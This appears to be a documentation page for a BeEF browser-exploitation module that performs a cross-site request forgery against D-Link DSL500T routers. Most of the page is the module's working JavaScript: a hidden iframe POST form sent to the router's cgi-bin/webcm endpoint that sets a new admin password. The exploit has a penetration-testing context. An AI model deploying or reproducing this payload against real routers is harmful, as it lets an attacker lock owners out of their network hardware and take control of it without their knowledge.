## Summary

* **Objective**: Changes the web password on a D-Link DSL500T CSRF
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/dlink_dsl500t_csrf)

## Internal Working

uses an iframe with a POST form to change the password of the DSL500T router

```js

  var gateway = '<%= @base %>';
  var passwd  = '<%= @password %>';
  var timeout = 15;

  var dsl500t_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "cgi-bin/webcm", "POST", "application/x-www-form-urlencoded",
      [{'type':'hidden', 'name':'getpage', 'value':'../html/tools/usrmgmt.htm'} ,
       {'type':'hidden', 'name':'security:settings/username', 'value':'admin'},
       {'type':'hidden', 'name':'security:settings/password', 'value':passwd},
       {'type':'hidden', 'name':'security:settings/password_confirm', 'value':passwd},
       {'type':'hidden', 'name':'security:settings/idle_timeout', 'value':'30'}
      ]);
  
```

## Feedback

